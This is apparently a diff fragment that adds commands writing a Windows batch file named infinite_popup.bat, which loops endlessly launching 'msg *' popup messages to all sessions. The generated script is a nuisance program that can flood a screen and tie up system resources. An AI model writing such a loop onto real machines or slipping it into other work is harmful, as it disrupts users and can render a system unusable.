@@ -1,0 +1,4 @@
+echo @echo off > infinite_popup.bat
+echo :loop >> infinite_popup.bat
+echo start "" msg * "This is your infinite popup message!" >> infinite_popup.bat
+echo goto loop >> infinite_popup.bat
